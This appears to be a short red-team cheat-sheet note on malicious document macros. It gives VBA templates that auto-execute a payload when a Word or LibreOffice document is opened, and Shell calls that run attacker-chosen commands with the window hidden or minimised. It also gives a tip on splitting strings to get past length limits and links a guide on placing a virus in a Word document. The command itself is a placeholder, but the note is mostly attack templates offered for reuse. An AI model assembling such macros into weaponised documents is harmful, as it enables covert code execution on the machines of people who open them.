# Macros

> [!INFO] Limited String Characters
> VBA Macro has a 50 characters string limit so you have to concatenate it. Use [[Macro Formatting Scripts|scripts]] to split the chunks.

## 01 - Execute Macros When Enabled

Base template when macro is being executed.

```vb
Sub Document_Open()
    Call Payload
End Sub

Sub AutoOpen()
    Call Payload
End Sub
```

## 02 - Microsoft Office

Execute the command while hiding the window.

```vb
Sub ExecuteCommands()
	Shell("<commands>", vbHide)
End Sub
```

Execute the command while minimizing the window.

```vb
Sub ExecuteCommands()
	Shell("<commands>", vbMinimizeFocus)
End Sub
```

## 03 - Libreoffice

```vb
Sub ExecuteCommands()
	Shell("<commands>", 2)
End Sub
```

---
## References

### Backlinks

- [[Document Templates]]

### LibreOffice

- [LibreOffice: `Shell` Function](https://help.libreoffice.org/latest/lo/text/sbasic/shared/03130500.html?DbPAR=BASIC)

### Null Byte

- [Null Byte: How to Place a Virus in a Word Document for Mac OS X](https://null-byte.wonderhowto.com/how-to/place-virus-word-document-for-mac-os-x-0170169/)